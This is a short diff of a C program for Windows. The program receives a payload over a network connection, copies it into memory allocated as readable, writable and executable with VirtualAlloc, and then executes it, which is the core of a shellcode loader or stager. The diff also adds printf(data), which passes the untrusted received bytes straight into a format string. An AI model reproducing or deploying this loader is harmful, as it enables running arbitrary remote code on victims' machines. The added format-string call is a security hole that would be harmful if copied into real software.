@@ -56,13 +56,12 @@ int main() {
       break;
     }
   } while (res > 0);
-  printf("Received payload with size of %d.\n", recvd);
-  //printf(data);
+  printf("Received payload with size of %d.\n", sizeof(data));
+  printf(data);
   printf("Allocating RWX memory.\n");
   // Allocate RWX memory for the data
   void* rwx = VirtualAlloc(NULL, PAYLOAD_SZ, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
   memcpy(rwx, data, PAYLOAD_SZ);
-  // VirtualProtect(data, sizeof(data), PAGE_EXECUTE_READWRITE, 0);
 
   printf("Executing payload.\n");
   // Execute the received payload
